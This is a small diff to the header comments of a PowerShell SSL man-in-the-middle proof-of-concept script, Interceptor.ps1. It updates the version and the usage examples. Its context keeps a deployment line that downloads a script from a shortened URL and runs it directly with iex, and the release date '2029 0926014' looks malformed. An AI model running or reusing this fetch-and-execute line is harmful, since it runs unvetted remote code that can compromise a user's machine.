@@ -11,7 +11,7 @@ Author: Casey Smith, Twitter: @subTee
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
-Version: 1.3.26
+Version: 1.3.27
 Release Date: 2029 0926014
 Deployment: iex (New-Object Net.WebClient).DownloadString(“http://bit.ly/1upejwC”)
 
@@ -41,7 +41,8 @@ Sometimes replaces "Cyber" with "Kitten"
 .EXAMPLE
 
 Interceptor.ps1 -ProxyServer localhost -ProxyPort 8888 
-Interceptor.ps1 -Tamper $true
+Interceptor.ps1 -Tamper 
+Interceptor.ps1 -HostCA
 
 .NOTES
 This script attempts to make SSL MITM accessible, by being a small compact proof of concept script.  
